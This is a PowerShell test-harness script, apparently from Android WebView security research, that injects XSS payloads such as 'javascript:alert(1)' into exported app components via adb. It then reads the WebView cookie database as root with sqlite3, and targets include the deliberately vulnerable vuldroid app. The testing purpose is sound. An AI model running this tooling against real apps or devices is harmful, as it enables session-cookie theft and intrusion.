# If(-not(Get-InstalledModule PSSQLite -ErrorAction silentlycontinue)){
#     Install-Module PSSQLite -Confirm:$False -Force
# }
# Import-Module PSSQLite
function attackXSS {
    param (
        $class_options
    )
    # Clear-Host
    for($i = 0; $i -lt $class_options.count; $i++){
        Write-Host "$($i): $($class_options[$i])"
    }
    $selection = Read-Host -Prompt "Specify class to attack"
    $className = $class_options[$selection]
    if ($IsWindows -or $ENV:OS) {
        $DevaaFolder = "C:\Users\elbon\Documents\GitHub\Devaa++"
    } else {
        $DevaaFolder = "/usr/local/codeql-home/codeql-repo/java/ql/test/query-tests/security/Devaa"
    }
    function Show-Menu {
        param (
            [string]$Title = 'Attacks List'
        )
        Write-Host "================ $Title ================"
        
        Write-Host "1: Enter URL to query"
        Write-Host "2: javascript:alert\(1\)"
        Write-Host "3: Send user profile"
        Write-Host "Q: Press 'Q' to quit"
    }

    # $query = Read-Host -Prompt 'Enter an XSS attack query'
    $packageString = aapt dump badging "$($DevaaFolder)/testRepo/app/build/outputs/apk/debug/app-debug.apk" | grep "package:\ name"
    $packageName = $packageString.Split("'")[1]
    $debugName = "app.swag.testcasedriver"
    # Write-Output $class_options
    adb shell su -c "rm /data/data/$($packageName)/app_webview/Default/Cookies"
    # adb uninstall $packageName
    # adb uninstall $debugName
    adb install -g "$($DevaaFolder)/testRepo/app/build/outputs/apk/debug/app-debug.apk"

    Write-Host $packageName
    # $allOutput = adb install -g app-debug.apk 2>&1
    # $stderr = $allOutput | ?{ $_ -is [System.Management.Automation.ErrorRecord] }
    # $stdout = $allOutput | ?{ $_ -isnot [System.Management.Automation.ErrorRecord]
# javascript:alert\(1\)
    # adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "https://www.zoho.com" --es className "com.vuldroid.application.YoutubeViewer" --es packageName "com.vuldroid.application" --es domain "https://zoho.com/"
    $payload = ""
    do
    {
        Show-Menu
        $selection = Read-Host "Please make a selection"
        switch ($selection)
        {
        # https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892
        '1' {
            # doesnâ€™t work for component exported by intent filter
            $payload = Read-Host -Prompt 'Enter URL?'
        } '2' {
            $payload = "javascript:alert\(1\)"
            # add in other payloads and change which style works
        }'3' {
            $payload = "javascript:alert\(1\)"
            # setAllowUniversalAccessFromFileURLs
        }
        }
        if($selection -ne 'q'){
            adb shell input keyevent KEYCODE_WAKEUP
            adb install -g "$($DevaaFolder)/exploit_engine/app-debug.apk"
            adb shell run-as $packageName pm clear $packageName
            adb shell am start -n "app.swag.testcasedriver/app.swag.testcasedriver.HTMLBasedEncodingXSSActivity" --es uri1 "$($payload)" --es className "$($className)" --es packageName "$($packageName)" --es domain "$($payload)"
            Start-Sleep -s 10
            adb shell input keyevent KEYCODE_HOME
            # root force-stop
            $kpid = adb shell pidof app.swag.testcasedriver
            adb shell am kill $kpid
            # adb shell pm disable $debugName
            # TODO give test runner permission to kill aps
            Start-Sleep -s 60
            $adb_command = "sqlite3 /data/data/$packageName/app_webview/Default/Cookies \'SELECT \* FROM cookies\'"
            # WHERE host_key LIKE \'$($payload.Split(".")[1])\'
            adb shell su -c "$adb_command"
            # adb uninstall $debugName
            
            # Start-Sleep -s 60
            # $adbData = adb shell "run-as $packageName sh -c 'cat /data/data/$packageName/app_webview/Default/Cookies'" 
                    # WILL probably have to find all Cookie named locations and cat wildacrd their content unless something else found
            # $Database = "$DevaaFolder/Cookies"
            
            # $adbData = adb shell "run-as $packageName sh -c 'grep -o '$($payload.Split(".")[1])' /data/data/$packageName/app_webview/Default/Cookies | wc -l'" 
            # Write-Host $adbData
            
            # /data/user/0
            # $query = "SELECT COUNT(*) FROM cookies WHERE host_key LIKE '%$($payload.Split(".")[1])%'"
            # $adbData > $Database
            # adb push sqlite3 /data/local/tmp
            # https://stackoverflow.com/a/60892396 arm64
            # sqlite3 Cookies "select * from cookies where host_key like '%zoho%'"
            # sqlite3 $Database $query
            # $queryResults = Invoke-SqliteQuery -Query $query -DataSource $Database
            # Write-Host $queryResults
        }
        # pause
    }
    while ($selection -ne 'q')
# adb.exe shell "sqlite3 $(filename) 'select * from cookies'"
# adb shell "sqlite3 /data/data/com.vuldroid.application/YoutubeViewer/Cookies 'select * from cookies'"
# TODO rooted device    
# adb pull "/data/data/com.vuldroid.application/databases"

    }

    # adb shell am start -n com.vuldroid.application/com.vuldroid.application.YoutubeViewer -d "https://picsum.photos/500"
